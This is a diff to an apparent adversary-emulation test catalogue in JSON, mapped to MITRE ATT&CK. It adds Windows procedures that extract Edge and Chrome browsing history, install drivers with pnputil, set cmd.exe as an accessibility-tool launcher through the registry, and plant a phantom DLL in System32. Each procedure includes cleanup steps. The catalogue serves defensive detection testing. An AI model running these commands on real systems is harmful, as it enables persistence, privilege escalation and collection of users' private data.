@@ -1318,6 +1318,44 @@
 		"phases": ["discovery"]
 	},
 	{
+		"name": "Extract Edge Browsing History",
+		"auto_generated_guid": "74094120-e1f5-47c9-b162-a418a0f624d5",
+		"supported_platforms": ["windows"],
+		"input_arguments": {
+			"history_path": {
+				"description": "Microsoft Edge browser history file path",
+				"type": "String",
+				"default": "$Env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\History"
+			},
+			"dest_path": {
+				"description": "Target file path to where the history to be extracted",
+				"type": "String",
+				"default": "$Env:USERPROFILE\\Downloads\\edgebrowsinghistory.txt"
+			}
+		},
+		"executor": {
+			"command": "$URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?'\n$History = Get-Content -Path \"#{history_path}\" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique\n$History | Out-File -FilePath \"#{dest_path}\"\n",
+			"cleanup_command": "Remove-Item -Path \"#{dest_path}\"\n",
+			"name": "powershell",
+			"elevation_required": true
+		},
+		"attack_technique": "T1217",
+		"phases": ["discovery"]
+	},
+	{
+		"name": "Extract chrome Browsing History",
+		"auto_generated_guid": "cfe6315c-4945-40f7-b5a4-48f7af2262af",
+		"supported_platforms": ["windows"],
+		"executor": {
+			"command": "$Username = (whoami).Split('\\')[1]\n$URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?'\n$History = Get-Content -Path \"$Env:systemdrive\\Users\\$UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique\n$History | Out-File -FilePath \"$Env:USERPROFILE\\Downloads\\chromebrowsinghistory.txt\"\n",
+			"cleanup_command": "Remove-Item -Path \"$Env:USERPROFILE\\Downloads\\chromebrowsinghistory.txt\"\n",
+			"name": "powershell",
+			"elevation_required": true
+		},
+		"attack_technique": "T1217",
+		"phases": ["discovery"]
+	},
+	{
 		"name": "Msiexec.exe - Execute Local MSI file with embedded JScript",
 		"auto_generated_guid": "a059b6c4-e7d6-4b2e-bcd7-9b2b33191a04",
 		"supported_platforms": ["windows"],
@@ -13080,6 +13118,25 @@
 		"executor": {
 			"command": "pnputil.exe /add-driver \"#{driver_inf}\"\n",
 			"name": "command_prompt",
+			"elevation_required": false
+		},
+		"attack_technique": "T1547",
+		"phases": ["persistence", "privilege-escalation"]
+	},
+	{
+		"name": "Driver Installation Using pnputil.exe",
+		"auto_generated_guid": "5cb0b071-8a5a-412f-839d-116beb2ed9f7",
+		"supported_platforms": ["windows"],
+		"input_arguments": {
+			"driver_path": {
+				"description": "Enter the driver file path to install (Default is used built-in windows driver - acpipmi.inf)",
+				"type": "path",
+				"default": "C:\\Windows\\INF\\acpipmi.inf"
+			}
+		},
+		"executor": {
+			"command": "pnputil.exe -i -a #{driver_path}\n",
+			"name": "powershell",
 			"elevation_required": false
 		},
 		"attack_technique": "T1547",
@@ -36593,10 +36650,23 @@
 		"auto_generated_guid": "444ff124-4c83-4e28-8df6-6efd3ece6bd4",
 		"supported_platforms": ["windows"],
 		"executor": {
-			"command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\"\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe\natbroker /start malware_test\n",
-			"cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\"\n",
+			"command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe /f\natbroker /start malware_test\n",
+			"cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\n",
 			"name": "command_prompt",
-			"elevation_required": false
+			"elevation_required": true
+		},
+		"attack_technique": "T1546.008",
+		"phases": ["persistence", "privilege-escalation"]
+	},
+	{
+		"name": "Auto-start application on user logon",
+		"auto_generated_guid": "7125eba8-7b30-426b-9147-781d152be6fb",
+		"supported_platforms": ["windows"],
+		"executor": {
+			"command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\" /v Configuration /t REG_SZ /d malware_test /f\n",
+			"cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\" /v Configuration /f\n",
+			"name": "command_prompt",
+			"elevation_required": true
 		},
 		"attack_technique": "T1546.008",
 		"phases": ["persistence", "privilege-escalation"]
@@ -37202,6 +37272,19 @@
 		"executor": {
 			"command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n",
 			"cleanup_command": "del %APPDATA%\\updater.exe >nul 2>&1\ndel %APPDATA%\\amsi.dll >nul 2>&1\n",
+			"name": "command_prompt",
+			"elevation_required": true
+		},
+		"attack_technique": "T1574.001",
+		"phases": ["defense-evasion", "persistence", "privilege-escalation"]
+	},
+	{
+		"name": "Phantom Dll Hijacking - WinAppXRT.dll",
+		"auto_generated_guid": "46ed938b-c617-429a-88dc-d49b5c9ffedb",
+		"supported_platforms": ["windows"],
+		"executor": {
+			"command": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\nren %APPDATA%\\amsi.dll WinAppXRT.dll\ncopy %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll\nreg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /t REG_EXPAND_SZ /d \"1\" /f\n",
+			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /f\ndel %windir%\\System32\\WinAppXRT.dll\ndel %APPDATA%\\WinAppXRT.dll\n",
 			"name": "command_prompt",
 			"elevation_required": true
 		},
